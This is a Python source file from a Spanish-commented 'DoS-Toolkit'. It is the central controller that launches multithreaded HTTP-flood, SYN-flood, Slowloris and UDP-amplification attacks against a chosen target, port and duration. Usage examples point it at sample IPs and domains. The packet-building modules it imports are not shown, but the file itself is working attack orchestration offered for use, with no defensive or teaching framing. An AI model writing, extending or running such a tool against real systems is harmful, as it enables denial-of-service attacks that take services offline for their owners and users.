#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DoS-Toolkit Python - Módulo de Ataques
Implementación de HTTP-Flood, SYN-Flood, Slowloris, UDP-Amplification
"""

import sys
import argparse
import threading
import socket
import time
import random
import string
from datetime import datetime
from pathlib import Path

# Importar módulos core
sys.path.insert(0, str(Path(__file__).parent))
from core.http_flood import HTTPFlood
from core.syn_flood import SYNFlood
from core.slowloris import Slowloris
from core.udp_amp import UDPAmplification
from core.utils_proxy import ProxyUtils


class AttackController:
    """Controlador central de ataques"""
    
    def __init__(self, attack_type, target, port, threads, duration):
        self.attack_type = attack_type
        self.target = target
        self.port = int(port)
        self.threads = int(threads)
        self.duration = int(duration)
        self.start_time = None
        self.packets_sent = 0
        self.lock = threading.Lock()

    def log(self, message, level="*"):
        """Registra mensajes con timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    def print_banner(self):
        """Imprime banner de inicio"""
        banner = f"""
╔════════════════════════════════════════════════════════════════╗
║                  DoS-TOOLKIT PYTHON v1.0                      ║
║                                                                ║
║  Ataque: {self.attack_type.upper():45} ║
║  Objetivo: {self.target}:{self.port:<40} ║
║  Threads: {self.threads:<50} ║
║  Duración: {self.duration}s{' '*45} ║
╚════════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def is_time_expired(self):
        """Verifica si el tiempo de ataque ha expirado"""
        if self.start_time is None:
            return False
        elapsed = time.time() - self.start_time
        return elapsed >= self.duration

    def increment_packets(self, count=1):
        """Incrementa contador de paquetes de forma thread-safe"""
        with self.lock:
            self.packets_sent += count

    def run_http_flood(self):
        """Ejecuta ataque HTTP-Flood"""
        self.log("Iniciando HTTP-Flood", "*")
        self.log(f"Objetivo: {self.target}:{self.port}", "*")
        
        http_flood = HTTPFlood(self.target, self.port)
        self.start_time = time.time()
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(
                target=self._http_flood_worker,
                args=(http_flood, i),
                daemon=True
            )
            threads.append(t)
            t.start()

        # Monitor thread
        monitor = threading.Thread(
            target=self._monitor_progress,
            daemon=True
        )
        monitor.start()

        # Esperar a que terminen
        for t in threads:
            t.join(timeout=self.duration + 5)

        self.log(f"Ataque completado. Total paquetes: {self.packets_sent}", "+")

    def _http_flood_worker(self, http_flood, worker_id):
        """Worker para HTTP-Flood"""
        try:
            while not self.is_time_expired():
                try:
                    http_flood.send_request()
                    self.increment_packets()
                except Exception as e:
                    self.log(f"Error en worker {worker_id}: {e}", "!")
                    time.sleep(0.1)
        except Exception as e:
            self.log(f"Worker {worker_id} terminado: {e}", "!")

    def run_syn_flood(self):
        """Ejecuta ataque SYN-Flood"""
        self.log("Iniciando SYN-Flood", "*")
        self.log(f"Objetivo: {self.target}:{self.port}", "*")
        
        syn_flood = SYNFlood(self.target, self.port)
        self.start_time = time.time()
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(
                target=self._syn_flood_worker,
                args=(syn_flood, i),
                daemon=True
            )
            threads.append(t)
            t.start()

        monitor = threading.Thread(
            target=self._monitor_progress,
            daemon=True
        )
        monitor.start()

        for t in threads:
            t.join(timeout=self.duration + 5)

        self.log(f"Ataque completado. Total paquetes: {self.packets_sent}", "+")

    def _syn_flood_worker(self, syn_flood, worker_id):
        """Worker para SYN-Flood"""
        try:
            while not self.is_time_expired():
                try:
                    syn_flood.send_syn_packet()
                    self.increment_packets()
                except Exception as e:
                    self.log(f"Error en worker {worker_id}: {e}", "!")
                    time.sleep(0.1)
        except Exception as e:
            self.log(f"Worker {worker_id} terminado: {e}", "!")

    def run_slowloris(self):
        """Ejecuta ataque Slowloris"""
        self.log("Iniciando Slowloris", "*")
        self.log(f"Objetivo: {self.target}:{self.port}", "*")
        
        slowloris = Slowloris(self.target, self.port)
        self.start_time = time.time()
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(
                target=self._slowloris_worker,
                args=(slowloris, i),
                daemon=True
            )
            threads.append(t)
            t.start()

        monitor = threading.Thread(
            target=self._monitor_progress,
            daemon=True
        )
        monitor.start()

        for t in threads:
            t.join(timeout=self.duration + 5)

        self.log(f"Ataque completado. Conexiones: {self.packets_sent}", "+")

    def _slowloris_worker(self, slowloris, worker_id):
        """Worker para Slowloris"""
        try:
            while not self.is_time_expired():
                try:
                    slowloris.send_slow_request()
                    self.increment_packets()
                except Exception as e:
                    self.log(f"Error en worker {worker_id}: {e}", "!")
                    time.sleep(0.5)
        except Exception as e:
            self.log(f"Worker {worker_id} terminado: {e}", "!")

    def run_udp_amplification(self):
        """Ejecuta ataque UDP-Amplification"""
        self.log("Iniciando UDP-Amplification", "*")
        self.log(f"Objetivo: {self.target}:{self.port}", "*")
        
        udp_amp = UDPAmplification(self.target, self.port)
        self.start_time = time.time()
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(
                target=self._udp_amp_worker,
                args=(udp_amp, i),
                daemon=True
            )
            threads.append(t)
            t.start()

        monitor = threading.Thread(
            target=self._monitor_progress,
            daemon=True
        )
        monitor.start()

        for t in threads:
            t.join(timeout=self.duration + 5)

        self.log(f"Ataque completado. Total paquetes: {self.packets_sent}", "+")

    def _udp_amp_worker(self, udp_amp, worker_id):
        """Worker para UDP-Amplification"""
        try:
            while not self.is_time_expired():
                try:
                    udp_amp.send_amplified_packet()
                    self.increment_packets()
                except Exception as e:
                    self.log(f"Error en worker {worker_id}: {e}", "!")
                    time.sleep(0.1)
        except Exception as e:
            self.log(f"Worker {worker_id} terminado: {e}", "!")

    def _monitor_progress(self):
        """Monitorea el progreso del ataque"""
        last_count = 0
        while not self.is_time_expired():
            time.sleep(5)
            elapsed = time.time() - self.start_time
            current_count = self.packets_sent
            pps = (current_count - last_count) / 5  # Paquetes por segundo
            remaining = self.duration - elapsed
            
            self.log(
                f"Progreso: {current_count} paquetes | "
                f"{pps:.1f} pps | Tiempo restante: {remaining:.0f}s",
                "~"
            )
            last_count = current_count

    def run(self):
        """Ejecuta el ataque seleccionado"""
        self.print_banner()
        
        attack_map = {
            'http_flood': self.run_http_flood,
            'syn_flood': self.run_syn_flood,
            'slowloris': self.run_slowloris,
            'udp_amplification': self.run_udp_amplification,
        }

        if self.attack_type not in attack_map:
            self.log(f"Ataque desconocido: {self.attack_type}", "!")
            sys.exit(1)

        try:
            attack_map[self.attack_type]()
        except KeyboardInterrupt:
            self.log("Ataque interrumpido por el usuario", "!")
        except Exception as e:
            self.log(f"Error durante el ataque: {e}", "!")
            sys.exit(1)


def main():
    """Punto de entrada principal"""
    parser = argparse.ArgumentParser(
        description='DoS-Toolkit Python - Ataques DoS Multi-tipo',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60
  python attacks.py --attack syn_flood --target example.com --port 443 --threads 100 --duration 120
  python attacks.py --attack slowloris --target 10.0.0.1 --port 8080 --threads 30 --duration 300
  python attacks.py --attack udp_amplification --target 192.168.1.100 --port 53 --threads 200 --duration 60
        """
    )

    parser.add_argument(
        '--attack',
        required=True,
        choices=['http_flood', 'syn_flood', 'slowloris', 'udp_amplification'],
        help='Tipo de ataque a ejecutar'
    )
    parser.add_argument(
        '--target',
        required=True,
        help='IP o dominio objetivo'
    )
    parser.add_argument(
        '--port',
        type=int,
        default=80,
        help='Puerto objetivo (default: 80)'
    )
    parser.add_argument(
        '--threads',
        type=int,
        default=100,
        help='Número de threads (default: 100)'
    )
    parser.add_argument(
        '--duration',
        type=int,
        default=60,
        help='Duración del ataque en segundos (default: 60)'
    )

    args = parser.parse_args()

    try:
        controller = AttackController(
            attack_type=args.attack,
            target=args.target,
            port=args.port,
            threads=args.threads,
            duration=args.duration
        )
        controller.run()
    except KeyboardInterrupt:
        print("\n[!] Operación cancelada por el usuario\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}\n")
        sys.exit(1)


if __name__ == '__main__':
    main()
